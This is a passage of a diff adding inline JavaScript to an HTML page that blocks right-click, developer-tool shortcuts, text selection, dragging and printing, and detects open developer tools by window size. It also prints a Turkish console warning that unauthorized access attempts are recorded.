+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        showWarning();
+        return false;
+    });
+    
+    // Klavye kısayollarını engelle
+    document.addEventListener('keydown', function(e) {
+        if (e.keyCode === 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
+            (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
+            (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+            (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
+            (e.ctrlKey && e.keyCode === 83)) { // Ctrl+S
+            e.preventDefault();
+            showWarning();
+            return false;
+        }
+    });
+    
+    // Console boyut kontrolü
+    setInterval(detectConsole, 500);
+    
+    // DevTools algılama (alternatif yöntem)
+    let devtools = {open: false, orientation: null};
+    
+    setInterval(function() {
+        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+            if (!devtools.open) {
+                devtools.open = true;
+                showWarning();
+            }
+        } else {
+            devtools.open = false;
+        }
+    }, 500);
+    
+    // Console mesajlarını temizle ve uyarı ekle
+    if (window.console) {
+        console.clear();
+        console.log('%cDikkat!', 'color: red; font-size: 30px; font-weight: bold;');
+        console.log('%cBu site korunmaktadır. Yetkisiz erişim girişimleri kaydedilir.', 'color: orange; font-size: 14px;');
+    }
+    
+    // Seçim engelleme
+    document.addEventListener('selectstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    // Sürükleme engelleme
+    document.addEventListener('dragstart', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    // Print ekranını engelle
+    window.addEventListener('beforeprint', function(e) {
+        e.preventDefault();
+        showWarning();
+        return false;
+    });
+    
+})();
+  </script>
+</body>
+</html>
+
